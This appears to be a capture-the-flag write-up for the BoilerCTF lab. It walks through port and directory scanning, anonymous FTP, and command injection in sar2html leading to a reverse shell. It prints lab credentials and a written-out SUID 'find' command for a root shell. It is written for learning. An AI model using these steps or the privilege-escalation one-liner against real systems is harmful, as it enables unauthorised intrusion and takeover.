# BoilerCTF

export IP=10.10.29.64

## Task 1

### 1 - File extension after anon login

start with the ol'nmap... <br>

cmd: nmap -sC -sV -oN nmap/ini $IP
```
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.128.84
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```
Access ftp, using creds
```
ftp $IP
Anonymous: <empty>

ls -la
-rw-r--r--    1 ftp      ftp            74 Aug 21 2019 .info.txt
```
Answer: txt

### 2 - What is on the highest port?
Since the nmap i got cannot provide the correct answer i just ran an all ports scan <br>

```
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.128.84
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
```

Answer: ssh
### 3 - What's running on port 10000?

Answer: Webmin

### 4 - Can you exploit the service running on that port? (yay/nay answer)

Answer: nay

### 5 - What's CMS can you access?
Did a gobuster on the base apache server

```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/joomla (Status: 301)
/manual (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
```

Answer: joomla
### 6 - Keep enumerating, you'll know when you find it.

lets do another gobuster on <b> http://10.10.29.64/joomla/ </b>

```
/_archive (Status: 301)
/_database (Status: 301)
/_files (Status: 301)
/_test (Status: 301) (nothing until here)
/administrator (Status: 301) (login)
/bin (Status: 301)
/build (Status: 301)
/cache (Status: 301)
/cli (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/installation (Status: 301)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/templates (Status: 301)
/tests (Status: 301)
/tmp (Status: 301)
```

In the _test folder, it appears a new interface, showing a report builder named <b> sar2html </b> <br>

with: <b>serachsploit sar2html </b> we get an exploit that showcases that when creating a new report suffers from command injection! <br>

First thing i tried was a ping and listening with tcpdump, and it worked!! <br>

Spawn a server, curl a rev shell and execute it <br>

```
whoami
www-data
```

### 7 - The interesting file name in the folder?

in this folder (where the vulnerability is) there's a log file
```
ls -la /var/www/html/joomla/_test
-rwxr-xr-x  1 www-data www-data 53430 Aug 22  2019 index.php
-rwxr-xr-x  1 www-data www-data   716 Aug 21  2019 log.txt <--------- (HERE)
-rw-r--r--  1 www-data www-data  5493 Oct 24 01:17 rev.php
-rwxr-xr-x  1 www-data www-data 53165 Mar 19  2019 sar2html
drwxr-xr-x  3 www-data www-data  4096 Aug 22  2019 sarFILE
```
Answer: log.txt
## Task 2 - 

### 1 - Where was the other users pass stored(no extension, just the name)?
from the log (in _test folder) we can su to basterd

```
su bastard
Password: superduperp@$$
```

in his home folder there's a backup file (contains creds)
```
stoner : superduperp@$$no1knows
```
Answer: backup

### 2 - user.txt
```
ls -la ~

drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret


cat ~/.secret
You made it till here, well done.
```

Answer: You made it till here, well done.

### 3 - What did you exploit to get the privileged user?

since sudo -l was joking, i just tried to check manually SUID binaries before launching linpeas and yes, there it is

```
cmd: find / -type f -perm /4000 -print 2>/dev/null
(....)
/usr/bin/find < ----------- (HERE)
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
(....)
```
Answer: find

### 4 - root.txt
Just used gtfobins 

```
cmd: /usr/bin/find . -exec /bin/bash -p \; -quit

whoami 
root

cat /root/root.txt 
It wasn't that hard, was it?
```